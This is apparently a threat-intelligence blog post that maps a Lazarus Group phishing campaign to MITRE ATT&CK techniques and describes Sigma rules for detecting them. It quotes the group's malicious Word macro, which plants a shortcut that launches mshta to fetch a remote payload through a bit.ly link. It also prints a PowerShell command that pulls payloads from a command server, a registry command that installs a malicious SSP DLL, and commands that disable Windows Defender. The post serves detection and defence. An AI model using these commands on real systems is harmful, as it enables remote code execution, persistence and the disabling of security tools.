In this post we will share open source\n[Sigma[1] rules and actionable detection insights to enable blue teams to detect attacks using](https://github.com/Neo23x0/sigma)\n[the same or similar techniques. The foundation of this work is a report[2] from the F-Secure](https://labs.f-secure.com/publications/ti-report-lazarus-group-cryptocurrency-vertical/)\nThreat Intelligence Team which exposed and detailed some of the Lazarus Group’s current\nmodus operandi. Our second blog will look at further techniques employed by the Lazarus\nGroup once they establish a foothold on a network.\n\nFrom the Threat Intelligence report, we know that the Lazarus Group employed varying\n[techniques across the MITRE ATT&CK® Matrix[3] in their attack. The reason for this blog’s](https://attack.mitre.org/matrices/enterprise/)\nfocus on TTPs is twofold. First, TTPs are more difficult and costly to change, as compared to\nIndicators of Compromise (IOCs) such as filenames, hashes and IP addresses. This makes\ndetection based on TTPs more reliable as blue teams can detect malicious activity even\nwhen IOCs change. Second, TTPs can be common across threat actors and detecting the\nTTPs used by the Lazarus Group will aid the detection of many other threat actors. For\nexample, according to MITRE, detecting the technique “Signed Binary Proxy Execution:\n[Mshta” provides coverage for 10 other APT groups[4] (this detail is in the “Procedure](https://attack.mitre.org/techniques/T1218/005/)\nExamples” section for each MITRE technique).\n\nAt F-Secure Countercept, we use a signature format similar to Sigma rules in our detection\nand response operations. Since Sigma rules provide a standardized open source signature\nformat, which allows blue teams to build detections that can be applied to many different\nSIEM log formats, we aim to provide detection value by contributing Sigma rules specific to\nthe detection of each relevant MITRE technique.\n\nWhile Sigma rules offer a powerful and flexible rule syntax for detection, using detection\nrules alone is not always the best approach for threat detection. Blue teams can also benefit\n[from using hunt queries (using Jupyter Notebooks[5] for example) when more](https://jupyter.org/)\ncomplex correlations between different datatypes are required for an accurate detection.\nWhile hunt queries allow more flexibility in working with different datatypes, they can\nconsume more resources, hence why sometimes classic detection capabilities are preferred.\nOver this and the following blog, we will also highlight instances where hunt queries could aid\nin the detection of malicious activity.\n\n\n-----\n\n## Breaking down the Lazarus Group campaign with MITRE\n\nThe following sections in this document map the key attack techniques used by the Lazarus\nGroup into the relevant MITRE ATT&CK® Matrix tactics. We then discuss how to detect\nthese techniques using Sigma rules.\n\nThe Sigma rules created for this report are marked in bold in the table below and are\n[provided in the F-Secure Countercept GitHub repository[6]. Existing Sigma rules are also](https://github.com/countercept/lazarus-sigma-rules)\nlisted below, as some techniques were already covered.\n\nInitial Access\n\n### T1566.003 – Phishing: Spearphishing via Service\n\nThe Lazarus Group gained initial access on the target organization by sending a phishing\ndocument to a systems administrator via their personal LinkedIn account. The document\nmasqueraded as a legitimate job advert. The embedded macro code was successfully\nexecuted on the target organization’s endpoint when the victim opened the document and\nenabled macro execution.\n\n\n-----\n\n**Detection**\n\nIt can be challenging to detect malicious documents as the embedded code is often\nobfuscated to evade detection from anti-virus and static file analysis. That said, an effective\ndetection approach is to look for malicious events that occur once the file is opened and the\nembedded payload is executed.\n\n[To demonstrate this, we downloaded and executed a malicious Word document[7]](https://www.virustotal.com/gui/file/7446efa798cfa7908e78e7fb2bf3ac57486be4d2edea8a798683c949d504dee6/details)\nassociated with the Lazarus Group's campaign to investigate the behavior of the embedded\npayload. Upon execution of the macro contained in the document, there are no ‘quick wins’\nfor detection opportunities, such as winword.exe launching processes such as PowerShell\nor cmd. We also did not observe other signs of suspicious activity, such as external network\nconnections being created directly from the winword.exe process.\n\nInstead we observed that the document writes a LNK file (named ‘esk.lnk’) to the user‘s\ntemporary file directory (determined through the GetSpecialFolder(2) method), and\nsubsequently launches the created shortcut file with Explorer.exe. This process can be seen\nin more detail by examining the macro code embedded in the Word document:\n\n\n-----\n\n```\nSub AutoOpen()\n  On Error Resume Next\n  Set FSS = CreateObject(\"Scripting.FileSystemObject\")\n  LPath = FSS.GetSpecialFolder(2) & \"\\esk.l\" & \"nk\"\n  ExPath = \"explorer \" & LPath\n  Set SHH = CreateObject(\"wscript.shell\")\n  Set LKO = SHH.CreateShortcut(LPath)\n  LKO.TargetPath = \"mshta\"\n  LKO.Arguments = \"ht\" & \"tps:/\" & \"/bi\" & \"t.ly/\" & \"2vwLE0m\"\n  LKO.Save\n  SHH.Run ExPath\n  ActiveDocument.Content.Font.Color = 0\n  ActiveDocument.ActiveWindow.View.Type = wdPrintView\n  ActiveDocument.Content.Font.Size = 12\n  Dim Splash As Shape\n  For Each Splash In ActiveDocument.Shapes\n    If Splash.AlternativeText = \"G\" & \"DP\" & \"R\" Then\n      Splash.Width = Splash.Height = 0\n    End If\n  Next Splash\n  ActiveDocument.ActiveWindow.View.ShowHiddenText = False\n  ActiveDocument.ActiveWindow.View.ReadingLayout = False\n  ActiveDocument.Content.Font.Hidden = False\nEnd Sub \n\n```\nTwo Sigma rules have been written to detect this anomalous behavior these can be found in\nour GitHub repository and are named win_word_create_lnk and win_word_launch_explorer\nrespectively.\n\n**win_word_create_lnk**\n\nBased on F-Secure Countercept’s endpoint telemetry, it is common behavior for the\nMicrosoft Word process (winword.exe) to create shortcut files for every Word document it\nopens. These files are usually stored in one of the following directories:\n\n%UserProfile%\\AppData\\Roaming\\Microsoft\\Office\\Recent\\\n%UserProfile%\\AppData\\Roaming\\Microsoft\\Word\\\n\nWith the exclusion of these two directories from the Sigma rule, we observed very few false\npositives of legitimate shortcut files being created in other directories.\n\nThe detection logic of this rule could also be extended to cover additional office applications\n(such as Excel) and to detect other high-risk filetypes being created, such as executable files\nor vba scripts.\n\n**win_word_launch_explorer**\n\nFrom our telemetry, we observed that the parent-child relationship of Winword.exe launching\nExplorer.exe was rare and non-existent in many networks. However, there are some client\nnetworks where false positives occurred due more customised use of Word documents\n\n\n-----\n\nwithin the organization. Therefore, blue teams working with noisy networks may consider\nfiltering for “.lnk” (and other high-risk extensions) in the command line arguments of\nExplorer.exe for a higher fidelity rule.\n\n## Execution\n\n### T1059.005 – Command and Scripting Interpreter: Visual Basic\n\nExecution of the .lnk file dropped by the malicious office document results in Mshta.exe\nconnecting to a “bit.ly” link to download a secondary payload. The “bit.ly” link redirected to a\nCommand and Control (C2) domain from which a VBScript was retrieved and executed to\nperform enumeration and collect further information on the host.\n\n**Detection**\n\n[From the technical details covered in the Weibu Intelligence Bureau report[8], we were able](https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=2371)\nto simulate the Mshta execution of a VBScript hosted on a web server. It became clear in the\nsimulation that the malicious VBScript hosted on the C2 domain was accessed and executed\nwithin the Mshta process. This means that there will not be any process creation telemetry\nthat can point to the execution of the VBScript.\n\nNonetheless, the execution of VBScript can be detected by analyzing image load events,\n[which are logged whenever a module is loaded into a process[9]. In order to execute](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90007)\nVBScript, the Mshta process will have to load the “vbscript.dll” module from disk which\ncontains API functions for VBScript. The Sigma rule created to detect this behavior can be\nfound on our GitHub and is named win_mshta_load_vbscript.\n\n\n-----\n\n### T1059.001 – Command and Scripting Interpreter: PowerShell\n\nThreat actors are known to commonly leverage PowerShell in their attacks due to its efficacy\nin interacting with Windows subsystems. This is also the case for Lazarus Group, where a\nPowerShell script was utilized to retrieve further payloads from their C2 domain:\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w Hidden -ep Bypass -file\nC:Users\\<USER>\\AppData\\Local\\Temp\\usoclient.ps1 66.181.166[.]15:8080/uc 188652471\n\n**Detection**\n\nAs PowerShell is also a common tool among system administrators, a simple detection of its\nexecution will often result in significant false positives. However, there are certain arguments\nthat tend to be more suspicious than others, such as the setting of Window style to “Hidden”,\n[and the temporary \"Bypass” of the execution policy. There is an existing Sigma rule [10] to](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_suspicious_invocation_specific.yml)\ndetect the presence of these arguments.\n\nIn addition to the above, alerting on PowerShell arguments that contain references to\nexternal IP addresses could be an effective detection mechanism. For MDR providers (such\nas F-Secure Countercept) this type of detection rule will often result in false positives due to\nthe number of administrative scripts on client estates which exhibit this behavior. However,\nfor internal detection teams this could prove to be a high-fidelity detection rule once the\nknown administrative scripts are filtered out. The Sigma rule created to detect this behavior\ncan be found on our GitHub and is named win_powershell_ip_args.\n\nFor MDR providers – or for detection in 'noisy’ estates – hunting instead of alerting for this\nbehavior is probably the most effective approach. Searching for PowerShell processes\nlaunched with arguments containing external IP addresses, and then aggregating the results\non the PowerShell arguments should result in an effective hunt query to look for this\nbehavior. If you are interested in exploring hunt queries, SpecterOps have a fantastic blog\n[series[11] covering threat hunting with Jupyter notebooks.](https://posts.specterops.io/threat-hunting-with-jupyter-notebooks-part-1-your-first-notebook-9a99a781fde7)\n\n## Persistence\n\n### T1547.005 – Boot or Logon Autostart Execution: Security Support Provider (SSP)\n\nWindows SSP DLLs provide applications access to Windows authentication methods such\n[as NTLM and Kerberos[12]. SSP DLLs are loaded into the Local Security Authority (LSA)](https://docs.microsoft.com/en-us/windows/win32/rpc/security-support-providers-ssps-)\nprocess on every machine boot and will execute with SYSTEM privileges once loaded.\nLazarus Group added a malicious “LSCC.dll” file as an SSP, via the following command:\n\nreg add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v Security\nPackages /t REG_MULTI_SZ /d lssc /f\n\n\n-----\n\n[As Sean Metcalf pointed out in his blog[13], adding a new SSP is quite easy and is a well-](https://adsecurity.org/?p=1760)\nknown technique used by many attackers. In fact, PowerSploit has an Install-SSP function in\n[its Persistence module [14], allowing threat actors to add a new malicious SSP as the](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1)\nLazarus Group did.\n\n**Detection**\n\nThis technique consists of two simple steps. First, add the malicious DLL in\n“C:\\Windows\\System32\\”. Next, update the Security Packages registry key with the name of\nthe DLL which was added in System32. A single command can be used to achieve this step,\nas shown from the above code block by Lazarus Group.\n\nDetection is therefore straightforward and can be achieved by looking at the “Security\n[Packages” registry key modification. There is already an existing Sigma rule[15] for this. This](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_ssp_added_lsa_config.yml)\nrule will detect any changes to this specific registry key, so the method used to modify the\n[key does not matter. For example, the threat actor could use PowerShell cmdlets[16] or even](https://devblogs.microsoft.com/scripting/weekend-scripter-use-powershell-to-easily-modify-registry-property-values/)\nthe user interface application Regedit.exe instead of Reg commands.\n\n## Defense Evasion\n\n### T1218.005 – Signed Binary Proxy Execution: Mshta\n\nLeveraging pre-installed windows binaries to bypass traditional signature-based defenses\nand execute malicious content has been a common technique utilized by threat actors.\n\nAs pointed out earlier, the Lazarus Group for instance, was observed using Mshta.exe to\nexecute malicious scripts via a \"bit ly\" redirect as seen below:\n\n\n-----\n\nmshta.exe https://bit[.]ly/2vvLE0n\n\nTo find out more about these binaries, often referred to as “Living Off the Land Binaries”\n[(LOLBin), blue teams may refer to the LOLBAS project[17] on their excellent documentation](http://https/lolbas-project.github.io/#/execute)\nof all discovered LOL binaries and scripts.\n\n**Detection**\n\nSigned binaries like Mshta.exe are often used for legitimate purposes, so from a detection\nperspective it is crucial to differentiate between legitimate and malicious usage. One way of\napproaching this would be to analyze the command arguments. Based on historical endpoint\ndata from F-Secure Countercept, use of “bit.ly” and other common redirection or codeshare\nsites like “pastebin.com” in command arguments is rare and uncommon. A Sigma rule has\nthus been written to detect binaries launched with “bit.ly” links and other popular codeshare\nsites in the arguments. Web browser binaries are commonly observed false positives and\nhave been excluded from the detection. The Sigma rule created to detect this behavior can\nbe found on our GitHub and is named win_nonbrowser_susp_url.\n\nAnother way to check for malicious usage of Mshta is to look at the child process(es)\nlaunched by the executable. To perform post-exploitation tasks, malicious scripts often\nlaunch shells such as Cmd.exe. Since Mshta proxies the execution of the script content, this\nwill result in process creation telemetry where Mshta launches Cmd.exe as a child process.\n\n[According to the Weibu Intelligence Bureau report[18] this is also the case for Lazarus](https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=2371)\nGroup’s campaign, where the bit.ly link executed by Mshta contained VBScript which made\nuse of the WshShell object to launch Cmd.exe. An existing Sigma rule is already available to\n[detect suspicious process creation by Mshta[19].](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml)\n\n### T1562.001 – Impair Defenses: Disable or Modify Tools\n\nDisabling Windows Defender\n\nOnce the Lazarus group established a foothold using the above LOLBin technique, the actor\nused the following PowerShell commands to disable Windows Defender monitoring as one of\ntheir first actions on each host they accessed:\n\ncmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\nSet-MpPreference -DisableBehaviorMonitoring $false 2>&1\n\ncmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\nSet-MpPreference -DisableRealtimeMonitoring $true 2>&1\n\n**Detection**\n\n\n-----\n\n[The commands above leverage the built-in functions for Windows Defender[20], which are](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=win10-ps)\noften used for legitimate purposes. Detection for this can be as simple as filtering for the\nparameters “DisableRealTimeMonitoring” OR “DisableBehaviorMonitoring” in command line\narguments or PowerShell script blocks.\n\nHowever, some Integrated Development Environment (IDE) applications such as those\ndeveloped by JetBrains are known to check for these Windows Defender parameters by\nusing the Get-MpPreference cmdlet. Therefore, blue teams may wish to filter for the “SetMpPreference” command alongside the two parameters. Otherwise, known false positives\nsuch as “Pycharm64.exe” and binaries residing in the “Jetbrains” path can be excluded. The\nlatter option results in a more generic rule which also detects for the enumeration of the two\nparameters. The Sigma rule created to detect this behavior can be found on our GitHub and\nis named win_powershell_disable_windefender.\n\n## Conclusion\n\nIn this first part of our two-part blog posts series, we demonstrated how blue teams can\ncapitalize on the technical insights from threat intelligence reports to build detection logic and\nactionable detection rules. Although the Lazarus Group used specific commands to carry out\neach technique, we showed that with some additional research blue teams can\ncreate powerful detection rules which will cover a larger set of attack vectors. We also\nshowed that although the Lazarus group used various techniques and tools to avoid\ndetection as they gained access to the victim network, there were still plenty of detection\nopportunities for blue teams to identify the threat actor’s activities.\n\nAlthough we have focused purely on the detection aspect throughout this blog post, it is also\nnotable that the Lazarus Group relied on techniques which could have been prevented by\nimplementing common security controls. For example: limiting or disabling macro execution\nfor documents from untrusted sources would have prevented the execution of the malicious\ndocument which provided the initial foothold on the victim network. Other controls, such as\nnetwork proxy content filtering or domain categorization could also have prevented the initial\nC2 connection, or the subsequent connections to other domains used by the threat actor to\ndownload additional tooling.\n\nIn this blog post we covered the Initial Access, Execution, Persistence and some of the\nDefense Evasion phases from the MITRE ATT&CK® Matrix and provided relevant Sigma\nrules and detection tips. As every network is different, we recommend studying the provided\nSigma rules before implementing them in your environment. The process of introducing new\nrules to a network is often an iterative process of development and whitelisting in order to get\nthe rules to a suitable level of fidelity.\n\n[All of the new Sigma rules referenced throughout this blog post can be found here.](https://github.com/countercept/lazarus-sigma-rules)\n\n\n-----\n\nIn the second part of this blog series we will cover techniques used by the Lazarus Group for\nDefense Evasion (yes, there is more to come!), Credential Access, Lateral Movement and\nCommand & Control phases, so stay tuned!\n\n\n-----",
